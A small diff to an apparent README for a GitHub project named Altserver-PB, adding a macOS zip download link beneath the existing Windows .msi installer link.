@@ -22,4 +22,5 @@ Download Link --> https://github.com/EkeLachin/Altserver-PB/archive/refs/heads/m
 
 ### .msi Microsoft İnstaller --> https://github.com/EkeLachin/Altserver-PB/raw/main/1WindowsDownload/AltInstaller.msi
 
-## MacOS 10.14.4+
+## MacOS 10.14.4+ ↓↓↓
+### https://github.com/EkeLachin/Altserver-PB/raw/main/2MacOS-Download.zip
